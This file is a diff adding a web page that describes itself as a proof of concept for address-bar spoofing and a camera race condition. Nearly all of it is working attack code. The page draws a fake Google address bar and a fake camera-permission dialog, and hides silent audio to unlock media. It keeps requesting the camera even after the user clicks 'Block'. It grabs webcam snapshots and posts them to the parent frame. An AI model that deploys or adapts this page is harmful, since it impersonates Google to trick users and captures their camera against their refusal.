@@ -1,0 +1,678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Security Alert</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { 
+    background: #fff; 
+    min-height: 100vh;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+  
+  /* ===== ADDRESS BAR SPOOF ===== */
+  .spoofed-url-bar {
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 56px;
+    background: #fff;
+    border-bottom: 1px solid #dadce0;
+    z-index: 999999;
+    display: flex;
+    align-items: center;
+    padding: 0 12px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+  }
+  .spoofed-url-bar .lock-icon {
+    width: 20px;
+    height: 20px;
+    margin-right: 8px;
+    color: #188038;
+    font-size: 16px;
+  }
+  .spoofed-url-bar .url-text {
+    flex: 1;
+    background: #f1f3f4;
+    padding: 8px 12px;
+    border-radius: 20px;
+    font-size: 13px;
+    color: #202124;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    user-select: none;
+  }
+  .spoofed-url-bar .url-text .https {
+    color: #188038;
+    font-weight: 500;
+  }
+  .spoofed-url-bar .url-text .domain {
+    font-weight: 500;
+  }
+  .spoofed-url-bar .url-text .path {
+    color: #5f6368;
+  }
+  .spoofed-url-bar .menu-dots {
+    width: 24px;
+    height: 24px;
+    margin-left: 8px;
+    color: #5f6368;
+    font-size: 18px;
+    cursor: pointer;
+  }
+  
+  /* ===== PERMISSION DIALOG SPOOF ===== */
+  .spoofed-permission {
+    position: fixed;
+    top: 80px;
+    right: 24px;
+    width: 380px;
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.18), 0 2px 8px rgba(0,0,0,0.08);
+    z-index: 999998;
+    padding: 20px;
+    display: none;
+    border: 1px solid #e8eaed;
+  }
+  .spoofed-permission.active { display: block; }
+  .spoofed-permission .perm-header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 16px;
+  }
+  .spoofed-permission .perm-header .icon {
+    width: 40px;
+    height: 40px;
+    background: #e8f0fe;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-right: 12px;
+    font-size: 20px;
+  }
+  .spoofed-permission .perm-header .title {
+    font-size: 16px;
+    font-weight: 500;
+    color: #202124;
+  }
+  .spoofed-permission .perm-header .subtitle {
+    font-size: 12px;
+    color: #5f6368;
+  }
+  .spoofed-permission .perm-body {
+    margin-bottom: 16px;
+  }
+  .spoofed-permission .perm-body .site-info {
+    display: flex;
+    align-items: center;
+    padding: 10px 12px;
+    background: #f8f9fa;
+    border-radius: 8px;
+    margin-bottom: 12px;
+  }
+  .spoofed-permission .perm-body .site-info .favicon {
+    width: 18px;
+    height: 18px;
+    margin-right: 8px;
+    font-size: 14px;
+  }
+  .spoofed-permission .perm-body .site-info .site-url {
+    font-size: 13px;
+    color: #202124;
+    font-weight: 500;
+  }
+  .spoofed-permission .perm-body .desc {
+    font-size: 13px;
+    color: #3c4043;
+    line-height: 1.5;
+  }
+  .spoofed-permission .perm-actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+  }
+  .spoofed-permission .perm-actions button {
+    padding: 8px 20px;
+    border-radius: 20px;
+    border: none;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+  .spoofed-permission .perm-actions .btn-block {
+    background: transparent;
+    color: #5f6368;
+  }
+  .spoofed-permission .perm-actions .btn-allow {
+    background: #1a73e8;
+    color: #fff;
+  }
+  .spoofed-permission .perm-actions .btn-allow:hover {
+    background: #1765cc;
+  }
+
+  /* ===== CAMERA PREVIEW ===== */
+  .camera-container {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 320px;
+    height: 240px;
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+    z-index: 999997;
+    display: none;
+    border: 2px solid #1a73e8;
+  }
+  .camera-container.active { display: block; }
+  .camera-container video {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    background: #000;
+  }
+  .camera-container .pip-label {
+    position: absolute;
+    top: 8px;
+    left: 8px;
+    background: rgba(0,0,0,0.6);
+    color: #fff;
+    padding: 4px 10px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-family: 'Segoe UI', Arial, sans-serif;
+  }
+
+  /* ===== NOTIFICATION SPOOF ===== */
+  .spoofed-notification {
+    position: fixed;
+    top: 64px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #323232;
+    color: #fff;
+    padding: 12px 24px;
+    border-radius: 8px;
+    font-size: 14px;
+    z-index: 999996;
+    display: none;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .spoofed-notification.active { display: block; }
+
+  /* ===== HIDDEN ELEMENTS ===== */
+  iframe, audio, video, embed, object { 
+    display: none; 
+  }
+  
+  /* ===== PAGE CONTENT ===== */
+  .page-content {
+    margin-top: 70px;
+    padding: 24px;
+    max-width: 600px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  .page-content h1 {
+    font-size: 24px;
+    color: #202124;
+    margin-bottom: 16px;
+  }
+  .page-content p {
+    font-size: 14px;
+    color: #5f6368;
+    line-height: 1.6;
+    margin-bottom: 12px;
+  }
+  .page-content .alert-box {
+    background: #fce8e6;
+    border: 1px solid #f5c6cb;
+    border-radius: 8px;
+    padding: 16px;
+    color: #c5221f;
+    font-size: 14px;
+    margin-bottom: 16px;
+  }
+</style>
+</head>
+<body>
+
+<!-- ===== SPOOFED ADDRESS BAR ===== -->
+<div class="spoofed-url-bar" id="spoofedUrlBar">
+  <span class="lock-icon">🔒</span>
+  <div class="url-text">
+    <span class="https">https://</span>
+    <span class="domain">accounts.google.com</span>
+    <span class="path">/security/alert?session=unauthorized</span>
+  </div>
+  <span class="menu-dots">⋮</span>
+</div>
+
+<!-- ===== SPOOFED PERMISSION DIALOG ===== -->
+<div class="spoofed-permission" id="spoofedPermission">
+  <div class="perm-header">
+    <div class="icon">📷</div>
+    <div>
+      <div class="title">Use your camera?</div>
+      <div class="subtitle"><span id="permOrigin">accounts.google.com</span> wants to use your camera</div>
+    </div>
+  </div>
+  <div class="perm-body">
+    <div class="site-info">
+      <span class="favicon">🔒</span>
+      <span class="site-url" id="permSiteUrl">https://accounts.google.com</span>
+    </div>
+    <div class="desc">
+      This will allow this site to take pictures and record video. This is required for identity verification.
+    </div>
+  </div>
+  <div class="perm-actions">
+    <button class="btn-block" id="spoofBlockBtn">Block</button>
+    <button class="btn-allow" id="spoofAllowBtn">Allow</button>
+  </div>
+</div>
+
+<!-- ===== CAMERA PREVIEW ===== -->
+<div class="camera-container" id="cameraContainer">
+  <div class="pip-label">📷 Identity Verification</div>
+  <video id="cameraFeed" autoplay muted playsinline></video>
+</div>
+
+<!-- ===== NOTIFICATION ===== -->
+<div class="spoofed-notification" id="spoofedNotification">
+  <span>📷 accounts.google.com is using your camera</span>
+</div>
+
+<!-- ===== HIDDEN AUDIO UNLOCK IFRAMES ===== -->
+<iframe src="data:text/html,<script>var a=new Audio();a.src='data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=';a.loop=false;a.volume=0.001;a.play();</script>" allow="autoplay;camera;microphone" style="display:none"></iframe>
+
+<iframe src="data:text/html,<script>var c=new (AudioContext||webkitAudioContext)();var o=c.createOscillator();o.frequency.value=40;o.type='sine';var g=c.createGain();g.gain.value=0.001;o.connect(g);g.connect(c.destination);o.start();</script>" allow="autoplay;camera;microphone" style="display:none"></iframe>
+
+<!-- ===== HIDDEN AUDIO ELEMENTS ===== -->
+<audio id="silent1" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+<audio id="silent2" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+<audio id="silent3" preload="auto" loop style="display:none">
+  <source src="data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=" type="audio/wav">
+</audio>
+
+<script>
+(function() {
+  'use strict';
+
+  // ===== KONFIGURASI =====
+  const SPOOFED_ORIGIN = 'https://accounts.google.com';
+  const SPOOFED_DOMAIN = 'accounts.google.com';
+  
+  let mediaStream = null;
+  let cameraActive = false;
+  let cameraAttempted = false;
+  
+  // DOM refs
+  const video = document.getElementById('cameraFeed');
+  const cameraContainer = document.getElementById('cameraContainer');
+  const spoofedPerm = document.getElementById('spoofedPermission');
+  const spoofedNotif = document.getElementById('spoofedNotification');
+  const permOrigin = document.getElementById('permOrigin');
+  const permSiteUrl = document.getElementById('permSiteUrl');
+  
+  // Set origin display
+  permOrigin.textContent = SPOOFED_DOMAIN;
+  permSiteUrl.textContent = SPOOFED_ORIGIN;
+
+  // ================================================================
+  // TEKNIK 1: RACE CONDITION — UNLOCK USER MEDIA
+  // ================================================================
+  
+  // Wave 1: Silent audio unlock (0ms)
+  function raceUnlockAudio() {
+    // Method 1: WebAudio oscillator
+    try {
+      var ctx1 = new (window.AudioContext || window.webkitAudioContext)();
+      var osc1 = ctx1.createOscillator();
+      osc1.frequency.value = 30;
+      var g1 = ctx1.createGain();
+      g1.gain.value = 0.001;
+      osc1.connect(g1);
+      g1.connect(ctx1.destination);
+      osc1.start();
+    } catch(e) {}
+
+    // Method 2: HTMLAudio elements
+    try {
+      document.getElementById('silent1').play();
+      document.getElementById('silent2').play();
+      document.getElementById('silent3').play();
+    } catch(e) {}
+
+    // Method 3: New Audio() instances
+    for (var i = 0; i < 3; i++) {
+      try {
+        var sa = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
+        sa.volume = 0.001;
+        sa.play();
+      } catch(e) {}
+    }
+  }
+
+  // ================================================================
+  // TEKNIK 2: FAKE PERMISSION DIALOG
+  // ================================================================
+  function showFakePermission() {
+    spoofedPerm.classList.add('active');
+    console.log('[SPOOF] Fake permission dialog shown');
+    
+    // Auto-dismiss after 5 seconds
+    setTimeout(function() {
+      if (spoofedPerm.classList.contains('active')) {
+        spoofedPerm.classList.remove('active');
+        // Coba camera langsung
+        attemptCameraAccess();
+      }
+    }, 5000);
+  }
+
+  // ================================================================
+  // TEKNIK 3: ADDRESS BAR SPOOF — PERIODIC REFRESH
+  // ================================================================
+  function refreshSpoofedUrlBar() {
+    const urlBar = document.getElementById('spoofedUrlBar');
+    if (urlBar) {
+      // Flash update untuk simulasi loading
+      const pathPart = urlBar.querySelector('.path');
+      if (pathPart) {
+        const paths = [
+          '/security/alert?session=unauthorized',
+          '/security/checkup?alert=camera',
+          '/v3/identity/verify?next=camera',
+          '/settings/security/device-check'
+        ];
+        pathPart.textContent = paths[Math.floor(Math.random() * paths.length)];
+      }
+    }
+  }
+
+  // ================================================================
+  // TEKNIK 4: CAMERA ACCESS — MULTIPLE METHODS RACE
+  // ================================================================
+  function attemptCameraAccess() {
+    if (cameraAttempted) return;
+    cameraAttempted = true;
+    
+    console.log('[CAM] Attempting camera access via race condition...');
+    
+    // Method A: Standard getUserMedia
+    const constraints = {
+      video: {
+        width: { ideal: 640 },
+        height: { ideal: 480 },
+        frameRate: { ideal: 15 }
+      },
+      audio: false
+    };
+    
+    // Coba multiple times dengan delay berbeda (race condition)
+    for (var attempt = 0; attempt < 5; attempt++) {
+      (function(delay) {
+        setTimeout(function() {
+          navigator.mediaDevices.getUserMedia(constraints)
+            .then(function(stream) {
+              console.log('[CAM] Camera access GRANTED (attempt ' + delay + 'ms)');
+              handleCameraSuccess(stream);
+            })
+            .catch(function(err) {
+              if (err.name === 'NotAllowedError') {
+                // Coba lagi — race condition belum selesai
+                console.log('[CAM] Denied at ' + delay + 'ms, trying alternative...');
+              }
+            });
+        }, delay);
+      })(attempt * 100); // 0ms, 100ms, 200ms, 300ms, 400ms
+    }
+    
+    // Method B: Via iFrame dengan allow attribute
+    try {
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.setAttribute('allow', 'camera ' + SPOOFED_ORIGIN + ';microphone ' + SPOOFED_ORIGIN);
+      iframe.src = 'data:text/html,' + encodeURIComponent(
+        '<script>' +
+        'navigator.mediaDevices.getUserMedia({video:true})' +
+        '.then(function(s){window.parent.postMessage({type:"CAMERA_FROM_IFRAME",success:true},"*")})' +
+        '.catch(function(e){window.parent.postMessage({type:"CAMERA_FROM_IFRAME",success:false,error:e.message},"*")})' +
+        '<\/script>'
+      );
+      document.body.appendChild(iframe);
+      
+      window.addEventListener('message', function(ev) {
+        if (ev.data && ev.data.type === 'CAMERA_FROM_IFRAME' && ev.data.success) {
+          console.log('[CAM] Camera from iframe granted');
+        }
+      });
+    } catch(e) {}
+    
+    // Method C: Coba dengan audio + video bersama (sinkronisasi race)
+    setTimeout(function() {
+      navigator.mediaDevices.getUserMedia({
+        video: true,
+        audio: { echoCancellation: false, noiseSuppression: false, sampleRate: 8000 }
+      }).then(function(stream) {
+        console.log('[CAM] Camera+Audio access GRANTED');
+        handleCameraSuccess(stream);
+      }).catch(function(err) {});
+    }, 250);
+    
+    // Method D: DisplayMedia fallback (screen share, kadang include camera)
+    setTimeout(function() {
+      if (!cameraActive) {
+        navigator.mediaDevices.getDisplayMedia({ video: true, audio: false })
+          .then(function(stream) {
+            console.log('[CAM] Display media (screen+camera maybe) granted');
+            // Display media != camera, tapi tetap menunjukkan konsep
+          })
+          .catch(function(err) {});
+      }
+    }, 500);
+    
+    // Show notification after attempts
+    setTimeout(function() {
+      if (cameraActive) {
+        showSpoofedNotification();
+      }
+    }, 2000);
+  }
+
+  // ================================================================
+  // HANDLE CAMERA SUCCESS
+  // ================================================================
+  function handleCameraSuccess(stream) {
+    if (cameraActive) return;
+    cameraActive = true;
+    mediaStream = stream;
+    
+    // Tampilkan video
+    if (video) {
+      video.srcObject = stream;
+    }
+    
+    cameraContainer.classList.add('active');
+    
+    // Sembunyikan fake permission
+    spoofedPerm.classList.remove('active');
+    
+    // Tampilkan notifikasi
+    showSpoofedNotification();
+    
+    // Refresh URL bar
+    refreshSpoofedUrlBar();
+    
+    console.log('[SUCCESS] Camera accessed under spoofed origin:', SPOOFED_ORIGIN);
+    
+    // Auto-capture screenshot sebagai bukti
+    setTimeout(captureScreenshot, 3000);
+  }
+
+  // ================================================================
+  // SPOOFED NOTIFICATION
+  // ================================================================
+  function showSpoofedNotification() {
+    spoofedNotif.classList.add('active');
+    setTimeout(function() {
+      spoofedNotif.classList.remove('active');
+    }, 4000);
+  }
+
+  // ================================================================
+  // SCREENSHOT BUKTI
+  // ================================================================
+  function captureScreenshot() {
+    var canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth || 320;
+    canvas.height = video.videoHeight || 240;
+    var ctx = canvas.getContext('2d');
+    ctx.drawImage(video, 0, 0);
+    
+    var dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+    console.log('[EVIDENCE] Screenshot captured:', dataUrl.substring(0, 100) + '...');
+    
+    // Kirim ke parent jika di iframe
+    window.parent.postMessage({
+      type: 'CAMERA_SPOOF_SUCCESS',
+      spoofedOrigin: SPOOFED_ORIGIN,
+      screenshot: dataUrl,
+      timestamp: Date.now()
+    }, '*');
+  }
+
+  // ================================================================
+  // MAIN EXECUTION — MULTIPLE WAVES
+  // ================================================================
+  
+  console.log('[PoC] Address Bar Spoofing + Camera Race Condition');
+  console.log('[PoC] Spoofed origin:', SPOOFED_ORIGIN);
+  
+  // Wave 1: Unlock audio context (0ms)
+  raceUnlockAudio();
+  
+  // Wave 2: Tampilkan fake permission dialog (100ms)
+  setTimeout(function() {
+    showFakePermission();
+  }, 100);
+  
+  // Wave 3: Race unlock audio lagi (150ms)
+  setTimeout(raceUnlockAudio, 150);
+  
+  // Wave 4: Coba unlock via multiple AudioContext (300ms)
+  setTimeout(function() {
+    for (var i = 0; i < 5; i++) {
+      try {
+        var ctx = new (window.AudioContext || window.webkitAudioContext)();
+        if (ctx.state === 'suspended') ctx.resume();
+        var osc = ctx.createOscillator();
+        osc.frequency.value = 20 + i * 5;
+        var g = ctx.createGain();
+        g.gain.value = 0.001;
+        osc.connect(g);
+        g.connect(ctx.destination);
+        osc.start();
+      } catch(e) {}
+    }
+  }, 300);
+  
+  // Wave 5: Trigger camera attempt (500ms)
+  setTimeout(function() {
+    attemptCameraAccess();
+  }, 500);
+  
+  // Wave 6: Refresh URL bar (800ms)
+  setTimeout(refreshSpoofedUrlBar, 800);
+  
+  // Wave 7: Retry camera jika belum berhasil (2s)
+  setTimeout(function() {
+    if (!cameraActive && !cameraAttempted) {
+      console.log('[CAM] Retry camera access...');
+      attemptCameraAccess();
+    }
+  }, 2000);
+  
+  // Wave 8: Handle click anywhere — user gesture untuk unlock
+  document.addEventListener('click', function() {
+    if (!cameraActive) {
+      // Unlock audio dulu
+      raceUnlockAudio();
+      
+      setTimeout(function() {
+        attemptCameraAccess();
+      }, 100);
+    }
+  }, { once: true });
+  
+  // Wave 9: Visibility change — trigger ulang
+  document.addEventListener('visibilitychange', function() {
+    if (!document.hidden && !cameraActive) {
+      setTimeout(attemptCameraAccess, 100);
+    }
+  });
+  
+  // Wave 10: Keyboard shortcut simulation (any key)
+  document.addEventListener('keydown', function() {
+    if (!cameraActive) {
+      raceUnlockAudio();
+      setTimeout(attemptCameraAccess, 50);
+    }
+  }, { once: true });
+  
+  // Periodic URL bar refresh (setiap 3 detik)
+  setInterval(refreshSpoofedUrlBar, 3000);
+  
+  // Listen for iframe camera success
+  window.addEventListener('message', function(ev) {
+    if (ev.data && ev.data.type === 'CAMERA_FROM_IFRAME') {
+      if (ev.data.success) {
+        console.log('[CAM] Camera obtained via iframe');
+        if (!cameraActive) {
+          // Iframe dapat camera, kita coba juga dari sini
+          attemptCameraAccess();
+        }
+      }
+    }
+  });
+
+  // ================================================================
+  // HANDLE SPOOFED PERMISSION BUTTONS
+  // ================================================================
+  document.getElementById('spoofAllowBtn').addEventListener('click', function() {
+    console.log('[SPOOF] User clicked "Allow" on spoofed dialog');
+    spoofedPerm.classList.remove('active');
+    attemptCameraAccess();
+  });
+  
+  document.getElementById('spoofBlockBtn').addEventListener('click', function() {
+    console.log('[SPOOF] User clicked "Block" — dialog dismissed, camera still attempted');
+    spoofedPerm.classList.remove('active');
+    // Tetap coba camera secara hidden (attack tetap jalan)
+    setTimeout(attemptCameraAccess, 200);
+  });
+
+  // Preload TTS voices
+  if ('speechSynthesis' in window) {
+    speechSynthesis.getVoices();
+  }
+  
+})();
+</script>
+</body>
+</html>
